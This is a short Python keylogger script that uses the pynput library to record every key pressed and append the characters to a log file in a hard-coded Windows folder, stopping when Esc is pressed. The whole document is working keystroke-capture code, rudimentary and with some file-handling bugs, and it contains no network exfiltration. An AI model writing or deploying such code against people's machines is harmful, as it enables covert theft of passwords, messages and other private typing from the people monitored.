from pynput.keyboard import Key, Listener
import time

keys_information = "key_log.txt"
keys_information_e = "e_key_log.txt"


file_path = "C:\Info-logger\Logged_information" # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

count = 0
keys =[]

def on_press(key):
    global keys, count, currentTime

    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

with open(file_path + extend + keys_information, "w") as f:
    f.write(" ")